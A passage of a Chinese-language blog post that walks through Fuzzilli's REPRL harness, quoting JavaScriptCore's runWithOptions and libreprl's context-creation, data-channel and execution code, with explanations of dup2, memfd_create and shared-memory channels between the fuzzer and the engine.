class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">runWithOptions</span><span class="hljs-params">(GlobalObject* globalObject, CommandLine&amp; options, <span class="hljs-type">bool</span>&amp; success)</span></span><br><span class="hljs-function"></span>&#123;<br>    Vector&lt;Script&gt;&amp; scripts = options.m_scripts;<br>    String fileName;<br>    Vector&lt;<span class="hljs-type">char</span>&gt; scriptBuffer;<br><br>    VM&amp; vm = globalObject-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_CATCH_SCOPE</span>(vm);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ENABLE(SAMPLING_FLAGS)</span><br>    SamplingFlags::<span class="hljs-built_in">start</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; scripts.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        JSInternalPromise* promise = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-type">bool</span> isModule = options.m_module || scripts[i].scriptType == Script::ScriptType::Module;<br>        <span class="hljs-keyword">if</span> (scripts[i].codeSource == Script::CodeSource::REPRL) &#123;<br>            <span class="hljs-type">size_t</span> script_size;<br>            <span class="hljs-built_in">CHECK</span>(<span class="hljs-built_in">read</span>(REPRL_CRFD, &amp;script_size, <span class="hljs-number">8</span>) == <span class="hljs-number">8</span>);<br>            <span class="hljs-built_in">CHECK</span>(script_size &lt; REPRL_MAX_DATA_SIZE);<br>            scriptBuffer.<span class="hljs-built_in">resize</span>(script_size);<br>            <span class="hljs-type">char</span>* ptr = scriptBuffer.<span class="hljs-built_in">data</span>();<br>            <span class="hljs-built_in">memcpy</span>(ptr, reprl_input_data, script_size);<br>            fileName = <span class="hljs-string">&quot;[REPRL]&quot;</span>_s;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (scripts[i].codeSource == Script::CodeSource::File) &#123;<br>            fileName = String::<span class="hljs-built_in">fromLatin1</span>(scripts[i].argument);<br>            <span class="hljs-keyword">if</span> (scripts[i].strictMode == Script::StrictMode::Strict)<br>                scriptBuffer.<span class="hljs-built_in">append</span>(<span class="hljs-string">&quot;\&quot;use strict\&quot;;\n&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;\&quot;use strict\&quot;;\n&quot;</span>));<br><br>            <span class="hljs-keyword">if</span> (isModule) &#123;<br>                <span class="hljs-comment">// If necessary, prepend &quot;./&quot; so the module loader doesn&#x27;t think this is a bare-name specifier.</span><br>                fileName = <span class="hljs-built_in">isAbsolutePath</span>(fileName) || <span class="hljs-built_in">isDottedRelativePath</span>(fileName) ? fileName : <span class="hljs-built_in">makeString</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-built_in">pathSeparator</span>(), fileName);<br>                promise = <span class="hljs-built_in">loadAndEvaluateModule</span>(globalObject, fileName, <span class="hljs-built_in">jsUndefined</span>(), <span class="hljs-built_in">jsUndefined</span>());<br>                <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">fetchScriptFromLocalFileSystem</span>(fileName, scriptBuffer)) &#123;<br>                    success = <span class="hljs-literal">false</span>; <span class="hljs-comment">// fail early so we can catch missing files</span><br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">size_t</span> commandLineLength = <span class="hljs-built_in">strlen</span>(scripts[i].argument);<br>            scriptBuffer.<span class="hljs-built_in">resize</span>(commandLineLength);<br>            std::<span class="hljs-built_in">copy</span>(scripts[i].argument, scripts[i].argument + commandLineLength, scriptBuffer.<span class="hljs-built_in">begin</span>());<br>            fileName = <span class="hljs-string">&quot;[Command Line]&quot;</span>_s;<br>        &#125;<br><br>        <span class="hljs-type">bool</span> isLastFile = i == scripts.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        SourceOrigin sourceOrigin &#123; <span class="hljs-built_in">absoluteFileURL</span>(fileName) &#125;;<br>        <span class="hljs-keyword">if</span> (isModule) &#123;<br>            <span class="hljs-keyword">if</span> (!promise) &#123;<br>                <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> This should use an absolute file URL https://bugs.webkit.org/show_bug.cgi?id=193077</span><br>                promise = <span class="hljs-built_in">loadAndEvaluateModule</span>(globalObject, <span class="hljs-built_in">jscSource</span>(<span class="hljs-built_in">stringFromUTF</span>(scriptBuffer), sourceOrigin, fileName, <span class="hljs-built_in">TextPosition</span>(), SourceProviderSourceType::Module), <span class="hljs-built_in">jsUndefined</span>());<br>                <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>            &#125;<br><br>            JSFunction* fulfillHandler = JSNativeStdFunction::<span class="hljs-built_in">create</span>(vm, globalObject, <span class="hljs-number">1</span>, <span class="hljs-built_in">String</span>(), [&amp;success, &amp;options, isLastFile](JSGlobalObject* globalObject, CallFrame* callFrame) &#123;<br>                <span class="hljs-built_in">checkException</span>(<span class="hljs-built_in">jsCast</span>&lt;GlobalObject*&gt;(globalObject), isLastFile, <span class="hljs-literal">false</span>, callFrame-&gt;<span class="hljs-built_in">argument</span>(<span class="hljs-number">0</span>), options, success);<br>                <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(<span class="hljs-built_in">jsUndefined</span>());<br>            &#125;);<br><br>            JSFunction* rejectHandler = JSNativeStdFunction::<span class="hljs-built_in">create</span>(vm, globalObject, <span class="hljs-number">1</span>, <span class="hljs-built_in">String</span>(), [&amp;success, &amp;options, isLastFile](JSGlobalObject* globalObject, CallFrame* callFrame) &#123;<br>                <span class="hljs-built_in">checkException</span>(<span class="hljs-built_in">jsCast</span>&lt;GlobalObject*&gt;(globalObject), isLastFile, <span class="hljs-literal">true</span>, callFrame-&gt;<span class="hljs-built_in">argument</span>(<span class="hljs-number">0</span>), options, success);<br>                <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(<span class="hljs-built_in">jsUndefined</span>());<br>            &#125;);<br><br>            promise-&gt;<span class="hljs-built_in">then</span>(globalObject, fulfillHandler, rejectHandler);<br>            scope.<span class="hljs-built_in">releaseAssertNoExceptionExceptTermination</span>();<br>            vm.<span class="hljs-built_in">drainMicrotasks</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            NakedPtr&lt;Exception&gt; evaluationException;<br>            JSValue returnValue = <span class="hljs-built_in">evaluate</span>(globalObject, <span class="hljs-built_in">jscSource</span>(scriptBuffer, sourceOrigin , fileName), <span class="hljs-built_in">JSValue</span>(), evaluationException);<br>            scope.<span class="hljs-built_in">assertNoException</span>();<br>            <span class="hljs-keyword">if</span> (evaluationException)<br>                returnValue = evaluationException-&gt;<span class="hljs-built_in">value</span>();<br>            <span class="hljs-built_in">checkException</span>(globalObject, isLastFile, evaluationException, returnValue, options, success);<br>        &#125;<br><br>        scriptBuffer.<span class="hljs-built_in">clear</span>();<br>        scope.<span class="hljs-built_in">clearException</span>();<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ENABLE(REGEXP_TRACING)</span><br>    vm.<span class="hljs-built_in">dumpRegExpTrace</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>总结一下大致的运行逻辑，由<code>main</code>到<code>jscmain</code>，然后调用<code>runJSC</code>函数，在<code>runJSC</code>函数中通过<code>do while</code>来循环调用<code>runWithOptions</code>函数并且负责将执行后的<code>status</code>传回到<code>Fuzzilli</code>，最后是<code>runWithOptions</code>函数负责从共享内存中读取数据到代码缓冲区，然后来运行。</p><h2 id="Fuzzilli中"><a href="#Fuzzilli中" class="headerlink" title="Fuzzilli中"></a>Fuzzilli中</h2><p>下面介绍的主要是围绕<code>libreprl</code>部分，因为这部分主要与<code>JSC</code>那边进行底层通信</p><h3 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h3><p>这个能追溯到<code>Fuzzer</code>初始化，最后在<code>REPRL</code>的<code>initialize</code>函数中：</p><p>调用了：</p><p><code>reprl_create_context</code></p><p><code>reprl_initialize_context</code></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>    reprlContext <span class="hljs-operator">=</span> libreprl.reprl_create_context()<br>    <span class="hljs-keyword">if</span> reprlContext <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Failed to create REPRL context&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> argv <span class="hljs-operator">=</span> convertToCArray(processArguments)<br>    <span class="hljs-keyword">let</span> envp <span class="hljs-operator">=</span> convertToCArray(env)<br><br>    <span class="hljs-keyword">if</span> reprl_initialize_context(reprlContext, argv, envp, <span class="hljs-comment">/* capture stdout */</span> <span class="hljs-number">1</span>, <span class="hljs-comment">/* capture stderr: */</span> <span class="hljs-number">1</span>) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>        logger.fatal(<span class="hljs-string">&quot;Failed to initialize REPRL context: <span class="hljs-subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>&quot;</span>)<br>    &#125;<br><br>    freeCArray(argv, numElems: processArguments.count)<br>    freeCArray(envp, numElems: env.count)<br><br>    fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">Shutdown</span>) &#123; <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span><br>        reprl_destroy_context(<span class="hljs-keyword">self</span>.reprlContext)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="reprl-create-context"><a href="#reprl-create-context" class="headerlink" title="reprl_create_context"></a>reprl_create_context</h4><p>下面主要注意下<code>dup2</code>函数：</p><blockquote><p>&#x2F;&#x2F; 该函数的作用是复制一个现有的文件描述符，并将其覆盖到另一个文件描述符上，使它们指向同一个文件。</p><p>int dup2(int oldfd, int newfd);</p></blockquote><p>所以下面<code>reprl_create_context</code>函数中是将预留的文件描述符暂时指向<code>/dev/null</code></p><blockquote><p>REPRL_CHILD_CTRL_IN 可以理解为控制通道，这个是入口</p><p>REPRL_CHILD_CTRL_OUT 这个是出口</p><p>REPRL_CHILD_DATA_IN 可以理解为数据通道，这个是入口</p><p>REPRL_CHILD_DATA_OUT 这个是出口</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// Well-known file descriptor numbers for reprl &lt;-&gt; child communication, child</span><br><span class="hljs-comment">// process side</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_CTRL_IN 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_CTRL_OUT 101</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_DATA_IN 102</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPRL_CHILD_DATA_OUT 103</span><br><span class="hljs-comment">// A unidirectional communication channel for larger amounts of data, up to a maximum size (REPRL_MAX_DATA_SIZE).</span><br><span class="hljs-comment">// Implemented as a (RAM-backed) file for which the file descriptor is shared with the child process and which is mapped into our address space.</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span> &#123;</span><br>    <span class="hljs-comment">// File descriptor of the underlying file. Directly shared with the child process.</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-comment">// Memory mapping of the file, always of size REPRL_MAX_DATA_SIZE.</span><br>    <span class="hljs-type">char</span>* mapping;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reprl_context</span> &#123;</span><br>    <span class="hljs-comment">// Whether reprl_initialize has been successfully performed on this context.</span><br>    <span class="hljs-type">int</span> initialized;<br><br>    <span class="hljs-comment">// Read file descriptor of the control pipe. Only valid if a child process is running (i.e. pid is nonzero).</span><br>    <span class="hljs-type">int</span> ctrl_in;<br>    <span class="hljs-comment">// Write file descriptor of the control pipe. Only valid if a child process is running (i.e. pid is nonzero).</span><br>    <span class="hljs-type">int</span> ctrl_out;<br><br>    <span class="hljs-comment">// Data channel REPRL -&gt; Child</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">data_in</span>;</span><br>    <span class="hljs-comment">// Data channel Child -&gt; REPRL</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">data_out</span>;</span><br>    <br>    <span class="hljs-comment">// Optional data channel for the child&#x27;s stdout and stderr.</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">child_stdout</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">child_stderr</span>;</span><br>    <br>    <span class="hljs-comment">// PID of the child process. Will be zero if no child process is currently running.</span><br>    <span class="hljs-type">pid_t</span> pid;<br><br>    <span class="hljs-comment">// Arguments and environment for the child process.</span><br>    <span class="hljs-type">char</span>** argv;<br>    <span class="hljs-type">char</span>** envp;<br>    <br>    <span class="hljs-comment">// A malloc&#x27;d string containing a description of the last error that occurred.</span><br>    <span class="hljs-type">char</span>* last_error;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> reprl_context* <span class="hljs-title function_">reprl_create_context</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// &quot;Reserve&quot; the well-known REPRL fds so no other fd collides with them.</span><br>    <span class="hljs-comment">// This would cause various kinds of issues in reprl_spawn_child.</span><br>    <span class="hljs-comment">// It would be enough to do this once per process in the case of multiple</span><br>    <span class="hljs-comment">// REPRL instances, but it&#x27;s probably not worth the implementation effort.</span><br>    <span class="hljs-type">int</span> devnull = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>    dup2(devnull, REPRL_CHILD_CTRL_IN);<br>    dup2(devnull, REPRL_CHILD_CTRL_OUT);<br>    dup2(devnull, REPRL_CHILD_DATA_IN);<br>    dup2(devnull, REPRL_CHILD_DATA_OUT);<br>    close(devnull);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> reprl_context));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="reprl-initialize-context"><a href="#reprl-initialize-context" class="headerlink" title="reprl_initialize_context"></a>reprl_initialize_context</h4><p>主要内容是对上下文结构体进行初始化，下面主要关注<code>reprl_create_data_channel</code>函数：</p><p><code>ctx -&gt; data_in</code>和<code>ctx -&gt; data_out</code>分别创建了一个<code>data_channel</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_initialize_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>** argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span>** envp, <span class="hljs-type">int</span> capture_stdout, <span class="hljs-type">int</span> capture_stderr)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ctx-&gt;initialized) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Context is already initialized&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// We need to ignore SIGPIPE since we could end up writing to a pipe after our child process has exited.</span><br>    signal(SIGPIPE, SIG_IGN);<br><br>    ctx-&gt;argv = copy_string_array(argv);<br>    ctx-&gt;envp = copy_string_array(envp);<br>    <br>    ctx-&gt;data_in = reprl_create_data_channel(ctx);<br>    ctx-&gt;data_out = reprl_create_data_channel(ctx);<br>    <span class="hljs-keyword">if</span> (capture_stdout) &#123;<br>        ctx-&gt;child_stdout = reprl_create_data_channel(ctx);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (capture_stderr) &#123;<br>        ctx-&gt;child_stderr = reprl_create_data_channel(ctx);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ctx-&gt;data_in || !ctx-&gt;data_out || (capture_stdout &amp;&amp; !ctx-&gt;child_stdout) || (capture_stderr &amp;&amp; !ctx-&gt;child_stderr)) &#123;<br>        <span class="hljs-comment">// Proper error message will have been set by reprl_create_data_channel</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <br>    ctx-&gt;initialized = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="reprl-create-data-channel"><a href="#reprl-create-data-channel" class="headerlink" title="reprl_create_data_channel"></a>reprl_create_data_channel</h4><p> <code>memfd_create()</code> 在内核中创建一个匿名内存文件，并返回一个指向该文件的文件描述符，并不会落地一个文件。</p><p> <code>mktemp()</code> 创建一个临时文件，是有文件名的；配合<code>unlink</code>可以删除文件在目录中的目录项，即删除文件名与文件inode的关联，但并不会关闭与该文件关联的文件描述符。</p><p>所以下面总体功能就是创建一个临时文件并得到文件描述符<code>fd</code>，并且将此文件映射到此进程即<code>mapping</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> data_channel* <span class="hljs-title function_">reprl_create_data_channel</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span><br>    <span class="hljs-type">int</span> fd = memfd_create(<span class="hljs-string">&quot;REPRL_DATA_CHANNEL&quot;</span>, MFD_CLOEXEC);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">char</span> path[] = <span class="hljs-string">&quot;/tmp/reprl_data_channel_XXXXXXXX&quot;</span>;<br>    <span class="hljs-keyword">if</span> (mktemp(path) &lt; <span class="hljs-number">0</span>) &#123;<br>        reprl_error(ctx, <span class="hljs-string">&quot;Failed to create temporary filename for data channel: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> fd = open(path, O_RDWR | O_CREAT| O_CLOEXEC);<br>    unlink(path);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span> || ftruncate(fd, REPRL_MAX_DATA_SIZE) != <span class="hljs-number">0</span>) &#123;<br>        reprl_error(ctx, <span class="hljs-string">&quot;Failed to create data channel file: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-type">char</span>* mapping = mmap(<span class="hljs-number">0</span>, REPRL_MAX_DATA_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mapping == MAP_FAILED) &#123;<br>        reprl_error(ctx, <span class="hljs-string">&quot;Failed to mmap data channel file: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data_channel</span>* <span class="hljs-title">channel</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> data_channel));<br>    channel-&gt;fd = fd;<br>    channel-&gt;mapping = mapping;<br>    <span class="hljs-keyword">return</span> channel;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="reprl-execute"><a href="#reprl-execute" class="headerlink" title="reprl_execute"></a>reprl_execute</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_execute</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* script, <span class="hljs-type">uint64_t</span> script_length, <span class="hljs-type">uint64_t</span> timeout, <span class="hljs-type">uint64_t</span>* execution_time, <span class="hljs-type">int</span> fresh_instance)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!ctx-&gt;initialized) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;REPRL context is not initialized&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (script_length &gt; REPRL_MAX_DATA_SIZE) &#123;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Script too large&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Terminate any existing instance if requested.</span><br>    <span class="hljs-keyword">if</span> (fresh_instance &amp;&amp; ctx-&gt;pid) &#123;<br>        reprl_terminate_child(ctx);<br>    &#125;<br><br>    <span class="hljs-comment">// Reset file position so the child can simply read(2) and write(2) to these fds.</span><br>    lseek(ctx-&gt;data_out-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    lseek(ctx-&gt;data_in-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) &#123;<br>        lseek(ctx-&gt;child_stdout-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) &#123;<br>        lseek(ctx-&gt;child_stderr-&gt;fd, <span class="hljs-number">0</span>, SEEK_SET);<br>    &#125;<br>    <br>    <span class="hljs-comment">// Spawn a new instance if necessary.</span><br>    <span class="hljs-keyword">if</span> (!ctx-&gt;pid) &#123;<br>        <span class="hljs-type">int</span> r = reprl_spawn_child(ctx);<br>        <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-comment">// Copy the script to the data channel.</span><br>    <span class="hljs-built_in">memcpy</span>(ctx-&gt;data_out-&gt;mapping, script, script_length);<br><br>    <span class="hljs-comment">// Tell child to execute the script.</span><br>    <span class="hljs-keyword">if</span> (write(ctx-&gt;ctrl_out, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span> ||<br>        write(ctx-&gt;ctrl_out, &amp;script_length, <span class="hljs-number">8</span>) != <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-comment">// These can fail if the child unexpectedly terminated between executions.</span><br>        <span class="hljs-comment">// Check for that here to be able to provide a better error message.</span><br>        <span class="hljs-type">int</span> status;<br>        <span class="hljs-keyword">if</span> (waitpid(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid) &#123;<br>            reprl_child_terminated(ctx);<br>            <span class="hljs-keyword">if</span> (WIFEXITED(status)) &#123;<br>                <span class="hljs-keyword">return</span> 